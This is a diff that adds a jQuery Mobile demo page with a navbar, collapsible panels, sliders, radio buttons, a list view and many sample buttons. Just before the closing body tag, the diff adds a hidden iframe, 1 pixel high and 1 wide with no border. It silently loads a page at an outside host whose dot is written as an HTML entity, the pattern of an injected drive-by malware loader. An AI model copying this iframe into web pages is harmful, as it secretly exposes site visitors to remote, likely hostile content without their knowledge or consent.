@@ -1,0 +1,122 @@
+<!DOCTYPE html> 
+<html> 
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+ 	<link rel="stylesheet" href="http://code.jquery.com/mobile/1.1.0/jquery.mobile-1.1.0.min.css" />
+	<script src="http://code.jquery.com/jquery-1.7.1.min.js"></script>
+	<script src="http://code.jquery.com/mobile/1.1.0/jquery.mobile-1.1.0.min.js"></script>
+	
+</head>
+<body> 
+
+<div data-role="page">
+
+	<div data-role="header" data-theme="e" data-position="fixed">
+		<h1 font-size="15">How do i look</h1>
+		<br><br>
+		<div data-role="navbar">
+	<ul>
+		<li><a href="a.html" class="ui-btn-active">One</a></li>
+		<li><a href="b.html" data-icon="grid" data-theme="e" data-iconpos="bottom">Two</a></li>
+		<li><a href="c.html" data-icon="refresh" data-iconpos="bottom">Three</a></li>
+		<li><a href="d.html" data-icon="grid" data-iconpos="bottom">Four</a></li>
+		<li><a href="e.html" data-icon="gear" data-iconpos="bottom">Five</a></li>
+	</ul>
+</div><!-- /navbar -->
+		
+	</div><!-- /header -->
+
+	<div data-role="content">	
+		<p>Hello world</p>	
+		
+
+<br>
+	<a href="index.html" data-transition="flow">I'll pop</a> 
+		<a href="frame.html" data-rel="dialog" data-transition="flow" data-direction="reverse">Dialogue</a> 
+		
+	<div data-role="collapsible" data-theme="a" data-content-theme="a">
+   <h3>Header swatch A</h3>
+   <div data-role="collapsible" data-theme="a" data-content-theme="a">
+   <h3>Header swatch A</h3>
+   <p>I'm the collapsible content with a themed content block set to "A".</p>
+   <a href="#" data-role="button" data-icon="grid" data-theme="e" data-iconpos="bottom"  data-inline="true" >Button</a>
+   <a href="#" data-role="button" data-icon="grid" data-theme="e" data-iconpos="bottom"  data-inline="true" >Button</a>
+   <a href="#" data-role="button" data-icon="grid" data-theme="e" data-iconpos="bottom"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="e" data-iconpos="bottom"  data-inline="true" >Button</a>
+<div data-role="fieldcontain">
+	<label for="slider-2">Input slider:</label>
+	<input type="range" name="slider-2" id="slider-2" value="25" min="0" max="100" data-theme="a" data-track-theme="e" />
+</div>
+<div data-role="fieldcontain">
+<label for="flip-b">Flip switch:</label>
+	<select name="slider" id="flip-b" data-role="slider">
+		<option value="no">No</option>
+		<option value="yes">Yes</option>
+	</select> 
+</div>
+	
+<div data-role="fieldcontain">
+    <fieldset data-role="controlgroup">
+    	<legend>Choose a pet:</legend>
+         	<input type="radio" name="radio-choice-1" id="radio-choice-1" value="choice-1" checked="checked" />
+         	<label for="radio-choice-1">Cat</label>
+
+         	<input type="radio" name="radio-choice-1" id="radio-choice-2" value="choice-2"  />
+         	<label for="radio-choice-2">Dog</label>
+
+         	<input type="radio" name="radio-choice-1" id="radio-choice-3" value="choice-3"  />
+         	<label for="radio-choice-3">Hamster</label>
+
+         	<input type="radio" name="radio-choice-1" id="radio-choice-4" value="choice-4"  />
+         	<label for="radio-choice-4">Lizard</label>
+    </fieldset>
+</div>
+	
+</div>
+<div data-role="collapsible" data-theme="a" data-content-theme="a">
+   <h3>Header swatch A</h3>
+   <p>I'm the collapsible content with a themed content block set to "A".</p>
+</div>s
+   <p>I'm the collapsible content with a themed content block set to "A".</p>
+</div>
+<br>	
+		
+<ul data-role="listview" data-inset="true" data-filter="true">
+	<li><a href="#">One</a></li>
+	<li><a href="#">two</a></li>
+	<li><a href="#">three</a></li>
+	<li><a href="#">four</a></li>
+	<li><a href="#">five</a></li>
+</ul>
+
+<form>
+   <label for="slider-0">Input slider:</label>
+   <input type="range" name="slider" id="slider-0" value="25" min="0" max="100"  />
+</form>
+
+<a href="#" data-role="button" data-icon="star" data-theme="a">Button</a>
+<a href="#" data-role="button" data-icon="refresh" data-theme="b" data-mini="true">Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="c" data-iconpos="bottom" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="c" data-iconpos="bottom"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="c" data-iconpos="top"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="a" data-iconpos="bottom"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="b" data-iconpos="top"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="d" data-iconpos="bottom"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="a" data-iconpos="top"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="e" data-iconpos="bottom"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="grid" data-theme="c" data-iconpos="top"  data-inline="true" >Button</a>
+<a href="#" data-role="button" data-icon="gear" data-theme="e">Button</a>
+
+	
+	</div><!-- /content -->
+<div data-role="footer" class="ui-bar">
+	<a href="index.html" data-role="button" data-icon="plus">Add</a>
+	<a href="index.html" data-role="button" data-icon="arrow-u">Up</a>
+	<a href="index.html" data-role="button" data-icon="arrow-d">Down</a>
+</div>
+</div><!-- /page -->
+
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
+</html>
